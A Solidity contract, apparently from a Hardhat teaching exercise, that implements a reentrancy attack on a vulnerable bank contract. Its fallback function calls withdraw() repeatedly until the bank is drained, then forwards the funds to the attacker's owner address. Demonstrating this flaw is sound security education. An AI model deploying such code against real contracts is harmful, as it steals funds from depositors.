// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "hardhat/console.sol";

// Interface for the Bank contract
interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attaker {
    IBank public immutable bank;
    address private owner; // Owner of the attacker contract

    // Modifier to restrict access to the contract owner
    modifier onlyOwner {
        require(owner == msg.sender, "You are not the owner");
        _;
    }

    // Constructor to set the bank contract address and owner
    constructor(address bankAddress) {
        bank = IBank(bankAddress);
        owner = msg.sender; // Set the owner to the address that deploys this contract
    }

    // Function to execute the attack
    function attack() external payable onlyOwner {
        // Deposit Ether into the bank contract
        bank.deposit{value: msg.value}();
        // Immediately withdraw the deposited Ether, triggering the reentrancy
        bank.withdraw();
    }

    // Fallback function to receive Ether and re-trigger the withdraw
    receive() external payable {
        // Continue withdrawing until the bank balance is drained
        if (address(bank).balance > 0) {
            console.log("attacking again...");
            bank.withdraw(); // Call withdraw again to exploit reentrancy
        } else {
            console.log("bank account drained");
            console.log("Actual Attaker balance: ", address(this).balance);
            // Transfer the drained funds to the owner
            payable(owner).transfer(address(this).balance);
        }
    }

    // Function to check the attacker's balance
    function getBalance() external view returns (uint256) {
        return address(this).balance; // Return the attacker's balance
    }
}
